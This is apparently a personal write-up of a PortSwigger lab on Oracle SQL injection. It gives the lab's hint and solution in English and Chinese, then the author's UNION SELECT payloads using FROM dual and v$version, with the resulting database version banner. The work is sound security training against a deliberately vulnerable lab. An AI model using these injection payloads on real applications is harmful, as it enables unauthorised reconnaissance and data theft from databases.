---
layout: post
title: "SQL injection attack, querying the database type and version on Oracle"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---





# SQL injection attack, querying the database type and version on Oracle


```
This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

#### Hint

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

For more information, see our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

#### Solution

1.  Use Burp Suite to intercept and modify the request that sets the product category filter.
2.  Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'+FROM+dual--`
3.  Use the following payload to display the database version:
    
    `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`



本實驗室在產品類別過濾器中包含一個 [SQL 注入](https://portswigger.net/web-security/sql-injection) 漏洞。您可以使用 UNION 攻擊從注入的查詢中檢索結果。

解決實驗，顯示數據庫版本字符串。

＃＃＃＃ 暗示

在 Oracle 數據庫中，每個 `SELECT` 語句都必須指定一個表來選擇 `FROM`。如果您的“UNION SELECT”攻擊沒有從表中查詢，您仍然需要包含“FROM”關鍵字，後跟有效的表名。

Oracle 上有一個名為“dual”的內置表，您可以將其用於此目的。例如：`UNION SELECT 'abc' FROM dual`

有關詳細信息，請參閱我們的 [SQL 注入備忘單](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

＃＃＃＃ 解決方案

1. 使用 Burp Suite 攔截和修改設置產品類別過濾器的請求。
2.確定[查詢返回的列數](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)和[which列包含文本數據](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)。在 `category` 參數中使用如下有效負載驗證查詢是否返回兩列，這兩列都包含文本：
    
    `'+UNION+SELECT+'abc','def'+FROM+dual--`
3. 使用以下負載顯示數據庫版本：
    
    `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`



```



```
category=Pets
```


失敗
```
' UNION SELECT NULL,NULL--
```


提示中說到Oracle數據庫查詢的時候必須帶上from，使用from默認表dual確定查詢的字段數為兩個
```
' UNION SELECT NULL,NULL FROM dual--
```

測試兩個都是字串欄位
```
' UNION SELECT 'aaa','bbb' FROM dual--
```


cheatsheet 給了不少payload:
https://portswigger.net/web-security/sql-injection/cheat-sheet

```
' UNION SELECT BANNER,NULL FROM v$version --
```


```
CORE 11.2.0.2.0 Production

NLSRTL Version 11.2.0.2.0 - Production

Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

PL/SQL Release 11.2.0.2.0 - Production

TNS for Linux: Version 11.2.0.2.0 - Production
```
